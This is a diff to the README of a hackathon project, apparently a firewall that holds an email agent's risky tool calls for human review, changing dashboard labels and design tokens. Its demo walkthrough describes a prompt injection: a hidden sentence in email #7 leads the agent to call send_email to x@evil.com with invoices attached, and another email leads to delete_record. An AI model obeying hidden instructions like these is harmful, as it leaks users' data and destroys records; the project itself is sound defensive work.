@@ -16,7 +16,7 @@ Built for **Agentika 2.0**, the AI automation hackathon at NaSCon 2026, FAST Uni
 4. [Quick start (local, with the mock API)](#quick-start-local-with-the-mock-api)
 5. [Repository layout](#repository-layout)
 6. [The pages](#the-pages)
-7. [Design: "Checkpoint"](#design-checkpoint)
+7. [Design](#design)
 8. [Demo data](#demo-data)
 9. [Policy and risk score](#policy-and-risk-score)
 10. [Agent prompts and tools](#agent-prompts-and-tools)
@@ -91,10 +91,10 @@ python -m uvicorn dev.mock_api:app --port 8000
 
 Open <http://localhost:8000>.
 
-1. Open the chat page and click **Summarise this month's invoices**. Watch the checkpoint log: `read_emails` and `list_invoices` are stamped **Cleared**, then `send_email` to `x@evil.com` lands in the **Hold bay**.
+1. On the **Agent** page, click **Summarise this month's invoices**. In the **Tool calls** ledger, `read_emails` and `list_invoices` are marked **✓ allowed**, then `send_email` to `x@evil.com` stops in **Waiting for a reviewer**.
 2. In a second window, open <http://localhost:8000/review> and sign in as `reviewer` with the mock password `demo-review` (set `MOCK_REVIEWER_PASSWORD` to change it; mock only, never use it on the live service).
-3. Inspect the evidence card. Email #7 is shown under the **UV lamp** with the hidden sentence glowing. Click **Show what a person saw** to see the same email without it.
-4. Click **Block** (or press **B**). The verdict is stamped, the call leaves the hold bay, and the agent tells the user what was stopped.
+3. Read the case file. Email #7 is shown as the agent read it, with the hidden sentence marked in highlighter. Switch to **What a person saw** to see the same email without it.
+4. Click **Block** (or press **B**). The call moves into the ledger as **✕ blocked**, and the agent tells the user what was stopped.
 
 The mock never calls a language model and never sends anything. Its agent is scripted.
 
@@ -150,39 +150,42 @@ All pages are server-rendered Jinja2 templates with small plain-JavaScript files
 
 | Route | Page | What it does |
 |---|---|---|
-| `/` | **Agent chat** | Send a task to the inbox agent. The **checkpoint log** shows every tool call live: risky ones park in the **hold bay**, everything else is stamped in the **inspection lane**, in order. The reply lists any stopped action. |
-| `/review` | **Reviewer desk** | The hold bay queue and the **evidence card**: the risk score on a 0–100 meter with the 30/70 thresholds, then the evidence chain (1) what the user asked, (2) what the agent read, (3) what it wants to do, (4) what the checkpoint found. Four decisions: Block, Always block, Allow once, Always allow. A countdown shows when the call will be blocked automatically. |
-| `/bench` | **Audit sheet** | The latest benchmark run: attacks caught, false alarms, added delay, human workload; one tile per scenario; results by category; a filterable table. A large "Mock" warning shows whenever the data is not from a real run. |
-| `/login` | **Reviewer pass** | Sign-in for the demo reviewer account. Only same-site `next` paths are followed after sign-in. |
+| `/` | **Agent** | A transcript with the inbox agent, and a numbered **Tool calls** ledger of every call it makes, live. Held calls wait in a separate **Waiting for a reviewer** box, then drop into the ledger in order once someone decides. The reply lists any stopped call. |
+| `/review` | **Review** | The queue of held calls and a **case file** for the selected one: a one-line headline, the risk score on a 0–100 meter with the 30/70 thresholds, then (1) what the user asked, (2) what the agent read, (3) the call it wants to run, with arguments copied from untrusted text flagged, (4) why it was held. Decisions: **Block** and **Allow once** as buttons, **Always block** / **Always allow** as links. A countdown shows when the call will be blocked automatically. |
+| `/bench` | **Benchmark** | The latest run: attacks stopped, false alarms, delay added, share of calls a person reviewed; one square per scenario; results by category; a filterable table. A clear "mock numbers" warning shows whenever the data is not from a real run. |
+| `/login` | **Sign in** | Sign-in for the demo reviewer account. Only same-site `next` paths are followed after sign-in. |
 
 Details that matter on stage:
 
-- **UV lamp.** The source that carried the hidden instruction is shown first, on a dark violet panel, with the raw text the AI read and the instruction glowing. **Show what a person saw** strips HTML comments, hidden elements (white text, `display:none`, 1px fonts) and image alt text, showing the email as a person would see it. The other sources fold away under "Show N other sources".
+- **Two views of the guilty email.** The source that carried the hidden instruction is shown first. **What the agent read** is the raw text, with the instruction marked in highlighter. **What a person saw** strips HTML comments, hidden elements (white text, `display:none`, 1px fonts) and image alt text, so the email looks as it would in a mail client. A note says when the marked sentence is invisible to a person. The other sources fold away under "N more sources the agent read".
 - **Keyboard:** **B** blocks the selected call. There is deliberately no shortcut for allowing.
 - **Live updates** use one Server-Sent Events connection per page, with automatic reconnection and a Live / Reconnecting indicator.
-- **Accessibility:** skip link, visible focus rings, `aria-live` regions for the log and queue, colour never used alone (every state is also a word on its stamp), `prefers-reduced-motion` respected, no horizontal scrolling at 375 px.
-- **Projector:** base font 17 px, high-contrast colours, layout tested at 1280 and 1366 px wide.
+- **Accessibility:** skip link, visible focus rings, `aria-live` regions for the log and queue, colour never used alone (every status tag has a glyph and a word: ✓ allowed, ◼ held, ✕ blocked), `prefers-reduced-motion` respected, no horizontal scrolling at 375 px.
+- **Projector:** base font 17 px, high-contrast ink on light paper, layout checked at 1280 px and at phone width.
 
 ---
 
-## Design: "Checkpoint"
+## Design
 
-The interface treats the firewall as a **security checkpoint for AI agents**: calls are inspected, stamped and either cleared or parked.
+The dashboard is built to look like an operator's tool, not a landing page: no marketing hero, no purple gradients, no card grid. It was reworked with the installed `frontend-design` and `redesign-skill` skills, using their audit of common "AI-generated" patterns.
 
 | Token | Value | Used for |
 |---|---|---|
-| Paper | `#EEF1F4` | page background, with a faint guilloché pattern like document stock |
-| Ink | `#14213D` | text, header, primary buttons |
-| Cleared | `#0E7C66` | safe calls, "Allow" decisions |
-| Hold | `#B86E00` | held calls, the hold bay's hazard stripes |
-| Seized | `#C8102E` | high risk, blocked calls |
-| UV | `#6D28D9` | the UV-lamp evidence view, focus rings |
+| Paper | `#F1F2EE` | page background, with a faint grain so it is not a flat fill |
+| Panel / well | `#FBFBF9` / `#E8EAE4` | panels and inset areas; depth comes from tone, not drop shadows |
+| Ink | `#1C1F24` | text, top bar, primary buttons, the call box |
+| Accent | `#2D57B5` | the one colour for things you can act on: links, focus rings, the selected item |
+| Hold | `#9E560E` | held calls only |
+| Stop | `#B42318` | blocked calls and high risk only |
+| Marker | `#FFE27A` | the highlighter mark on a hidden instruction |
 
-- **Type:** Archivo (display, stamps) · IBM Plex Sans (body) · IBM Plex Mono (tool calls, numbers). Fonts are **self-hosted** in `app/static/fonts`, so the demo works even if the venue blocks font CDNs.
-- **Stamps:** verdicts are rubber stamps (Cleared, Held, Blocked, Denied, Timed out). A decision stamps a large verdict onto the evidence card.
-- **Animations** never hide content. They only move or brighten it, so a paused background window still shows everything.
+- **Type:** IBM Plex Sans (interface) · IBM Plex Mono (tool calls, IDs, numbers in tables) · Archivo (the large risk and benchmark numbers). All **self-hosted** in `app/static/fonts`, so the demo works even if the venue blocks font CDNs. Labels are sentence case.
+- **Status tags** are small square tags with a glyph and a word, never colour alone.
+- **Shapes:** 3 px tags, 6 px controls, 8 px panels. Hairline borders instead of shadows.
+- **The mark:** a toll-gate barrier, lowered (top bar and favicon).
+- **Motion** is limited to a short slide-in for new ledger rows and the risk meter filling. Nothing is ever hidden by an animation, and `prefers-reduced-motion` turns it off.
 
-The pitch deck uses the same palette and type.
+The pitch deck uses the same palette and type, with one background colour (`#F1F2EE`) on every slide.
 
 ---
 
@@ -220,7 +223,7 @@ Worked examples (from `docs/policy-rules.md`):
 
 | Call | Score | Result |
 |---|---|---|
-| `send_email` to a colleague, no attachment | 0 | Cleared |
+| `send_email` to a colleague, no attachment | 0 | Allowed |
 | `send_email(to=x@evil.com, attachment=invoices_oct.zip)` after email #7 | 100 | Held (high) |
 | `delete_record(CUST-1001)` after email #10 | 95 | Held (high) |
 | Summary to a colleague containing a link taken from an email | 55 | Held (medium) |
